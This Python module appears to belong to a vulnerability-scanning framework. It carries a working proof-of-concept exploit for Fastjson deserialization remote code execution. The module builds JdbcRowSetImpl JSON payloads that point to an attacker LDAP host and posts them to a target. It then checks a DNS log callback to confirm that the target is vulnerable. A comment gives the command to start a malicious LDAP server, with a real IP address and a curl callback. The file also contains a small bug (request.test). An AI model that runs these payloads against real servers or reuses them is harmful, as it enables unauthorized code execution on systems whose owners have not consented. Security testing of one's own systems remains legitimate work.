import requests,time,re,json
from requests_toolbelt.utils import dump
from ClassCongregation import _urlparse
from urllib.parse import urlparse, quote
from ClassCongregation import Dnslog
import CodeTest
################
##--Fastjson--##
#cve_2017_18349 反序列化命令执行
################
#echo VuLnEcHoPoCSuCCeSS
#VULN = None => 漏洞测试
#VULN = True => 命令执行
# 用法：java -cp fastjson_tool.jar fastjson.HLDAPServer 106.12.132.186 10086 "curl xxx.dnslog.cn"
# eg: 传入 IP+port 即可
CodeTest.VULN = None
CodeTest.DEBUG = True
TIMEOUT = 10
DL = Dnslog()
class Fastjson():
    def __init__(self, url, CMD):
        self.url = url
        self.CMD = CMD
        self.getipport = urlparse(self.url)
        self.hostname = self.getipport.hostname
        self.port = self.getipport.port
        self.host = self.hostname + ":" + str(self.port)
        self.headers = {
            'Host': ""+self.host,
            'Accept': '*/*',
            'Connection': 'close',
            'Accept-Language': 'en',
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36',
            'Content-Type': 'application/json',
            'X-Client-TimeStamp': '1609093784',
            'X-Client-Identity': 'f4ad8bc756bd2fd6ef5685b5fb780bce',
            'X-Client-Sign': '27b838d3918aae04'
        }
        self.payload_cve_2017_18349_24 = {
            "b": {
                "@type": "com.sun.rowset.JdbcRowSetImpl",
                "dataSourceName": "ldap://" + self.CMD + "/Object",
                "autoCommit": True
            }
        }
        self.payload_cve_2017_18349_24 = json.dumps(self.payload_cve_2017_18349_24)

        self.payload_cve_2017_18349_47 = '''{
        "a": {
            "@type": "java.lang.Class",
            "val": "com.sun.rowset.JdbcRowSetImpl"
        },
        "b": {
            "@type": "com.sun.rowset.JdbcRowSetImpl",
            "dataSourceName": "ldap://%s/Object",
            "autoCommit": true
        }
    }
    '''%self.CMD

    def cve_2017_18349_24(self):
        self.pocname = "Fastjson: cve_2017_18349_24"
        self.method = "post"
        self.rawdata = "null"
        self.info = "null"
        try:
            self.request = requests.post(self.url, data=self.payload_cve_2017_18349_24, headers=self.headers, timeout=TIMEOUT, verify=False)
            self.rawdata = dump.dump_all(self.request).decode('utf-8', 'ignore')
            time.sleep(2)
            #if DL.result() or self.request.status_code==500:
            if DL.result():
                self.info = CodeTest.Colored_.derce() + ' [version: <1.2.24]'
                self.r = 'VuLnEcHoPoCSuCCeSS'
                CodeTest.verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
                return
            CodeTest.verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
        except requests.exceptions.Timeout as error:
            CodeTest.verify.timeout_output(self.pocname)
        except requests.exceptions.ConnectionError as error:
            CodeTest.verify.connection_output(self.pocname)
        except Exception as error:
            CodeTest.verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)

    def cve_2017_18349_47(self):
        self.pocname = "Fastjson: cve_2017_18349_47"
        self.method = "post"
        self.rawdata = "null"
        self.info = "null"
        try:
            self.request = requests.post(self.url, data=self.payload_cve_2017_18349_47, headers=self.headers, timeout=TIMEOUT, verify=False)
            self.rawdata = dump.dump_all(self.request).decode('utf-8', 'ignore')
            time.sleep(2)
            #if DL.result() or self.request.status_code==400:
            if DL.result():
                self.info = CodeTest.Colored_.derce() + ' [version: <1.2.47]'
                self.r = 'VuLnEcHoPoCSuCCeSS'
                CodeTest.verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
                return
            CodeTest.verify.generic_output(self.request.test, self.pocname, self.method, self.rawdata, self.info)
        except requests.exceptions.Timeout as error:
            CodeTest.verify.timeout_output(self.pocname)
        except requests.exceptions.ConnectionError as error:
            CodeTest.verify.connection_output(self.pocname)
        except Exception as error:
            CodeTest.verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info) 
print("""
+-------------------+------------------+-----+-----+-------------------------------------------------------------+
| Target type       | Vuln Name        | Poc | Exp | Impact Version && Vulnerability description                 |
+-------------------+------------------+-----+-----+-------------------------------------------------------------+
| Fastjson          | cve_2017_18349   |  Y  |  N  | < 1.2.24 or < 1.2.47, deserialization remote code execution |
+-------------------+------------------+-----+-----+-------------------------------------------------------------+""")
def check(**kwargs):
    if CodeTest.VULN == None:
        ExpFastjson = Fastjson(kwargs['url'],DL.dns_host())
    else:
        ExpFastjson = Fastjson(kwargs['url'],kwargs['cmd'])
    if kwargs['pocname'] == "cve_2017_18349_24":
        ExpFastjson.cve_2017_18349_24()
    elif kwargs['pocname'] == "cve_2017_18349_47":
        ExpFastjson.cve_2017_18349_47()
    else:
        ExpFastjson.cve_2017_18349_24()
        ExpFastjson.cve_2017_18349_47()



















